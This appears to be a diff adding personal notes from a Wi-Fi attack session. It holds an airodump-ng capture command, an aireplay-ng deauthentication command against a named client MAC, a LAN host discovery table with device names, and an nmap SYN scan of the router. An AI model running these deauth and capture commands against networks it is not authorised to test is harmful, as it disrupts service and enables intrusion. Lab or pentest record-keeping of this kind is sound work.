@@ -1,0 +1,27 @@
+airodump-ng 11  -w demo.txt --bssid 6C:55:E8:55:66:F0 wlan0 
+
+aireplay-ng -0 5 -a 6C:55:E8:55:66:F0 -c 44:a1:91:99:6d:9e wlan0
+
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.1.1     44:a1:91:99:6d:9e      1      42  HUAWEI TECHNOLOGIES CO.,LTD	Tia Elva
+ 192.168.1.18    c8:22:02:35:c5:ff      3     180  Unknown vendor				Descubrir
+ 192.168.1.100   04:5d:4b:bf:5f:70      1      60  Sony Corporation				Descubrir
+  192.168.1.155   d0:b1:28:0b:f3:ef      2      84  Samsung Electronics Co.,Ltd  Nora
+
+└─# nmap -sS 192.168.1.1
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 19:58 -03
+Nmap scan report for 192.168.1.1
+Host is up (0.011s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT   STATE    SERVICE
+21/tcp filtered ftp
+22/tcp filtered ssh
+23/tcp filtered telnet
+53/tcp open     domain
+80/tcp filtered http
+MAC Address: 44:A1:91:99:6D:9E (Huawei Technologies)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.73 seconds
+
